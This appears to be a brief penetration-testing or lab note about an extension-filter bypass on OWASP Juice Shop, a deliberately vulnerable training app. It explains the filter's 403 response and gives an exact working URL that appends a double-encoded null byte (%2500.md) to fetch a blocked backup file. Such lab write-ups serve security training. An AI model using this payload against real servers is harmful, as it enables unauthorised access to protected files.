Engagement: c02-ftp-bypass
Target: http://host.docker.internal:3000 (OWASP Juice Shop)
Vulnerability: /ftp extension filter bypass via URL-encoded double-encoding of a null byte (%2500.md)
Filter behavior: direct GET /ftp/package.json.bak -> 403 'Only .md and .pdf files are allowed!'
Bypass: append %2500.md to the filename. Express decodes %25 -> '%', yielding a trailing '.md'
         that satisfies the filter; the filesystem path 'package.json.bak' is then used as-is.

EXACT WORKING URL:
http://host.docker.internal:3000/ftp/package.json.bak%2500.md
